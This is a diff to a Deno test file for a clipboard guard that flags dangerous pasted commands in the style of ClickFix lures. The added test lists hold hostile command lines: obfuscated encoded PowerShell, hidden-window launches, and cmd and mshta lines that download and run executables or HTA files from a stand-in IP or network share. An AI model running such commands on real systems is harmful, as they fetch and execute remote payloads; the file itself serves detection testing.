@@ -91,11 +91,46 @@ Deno.test("clipboard guard patterns: the 2026-11-16 ClickFix forms match; near-m
   for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
 });
 
+// powershell.exe takes a switch after "/", "-", "--" or a Unicode dash, and
+// any prefix of its name; WindowStyle 1 is Hidden. cmd takes other switches
+// before /c. These forms passed before (2026-11-27).
+const MISSED_2026_11_27 = [
+  "powershell /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell \u2013enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell.exe \u2014e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "pwsh --EncodedC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "powershell /w hidden -c \"Start-Process calc\"",
+  "powershell -w 1 -c \"Start-Process calc\"",
+  "powershell -WindowS Hidden -c \"Start-Process calc\"",
+  "powershell -nop \u2015w h -c \"Start-Process calc\"",
+  "cmd /q /c curl -o %TEMP%\\a.exe https://203.0.113.5/a.exe && %TEMP%\\a.exe",
+  "cmd.exe /v:on /c curl -o a.exe https://203.0.113.5/a.exe",
+  "cmd/c start /min mshta https://203.0.113.5/v.hta",
+  "powershell /file \\\\203.0.113.5\\share\\x.ps1",
+];
+const BENIGN_2026_11_27 = [
+  "powershell -ExecutionPolicy Unrestricted -File setup.ps1",
+  "powershell -WindowStyle Normal -Command Get-Date",
+  "powershell -w maximized -c Get-Date",
+  "powershell -c \"Get-Process | Out-String -Width 1\"",
+  "powershell -c Remove-Item x.txt -WhatIf 1",
+  "cmd /q /c echo hello",
+  "cmd /d /c dir C:\\Users",
+];
+
+Deno.test("clipboard guard patterns: /, Unicode dashes, switch prefixes, WindowStyle 1 and cmd switches before /c match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+});
+
 Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
   const g = loadClip();
   const size = 100 * 1024;
   const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
-  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "a", " ", "/"].map(fill);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "a", " ", "/"].map(fill);
   // A generous limit: the machine is shared. A quadratic pattern takes
   // seconds on these inputs.
   const LIMIT_MS = 500;
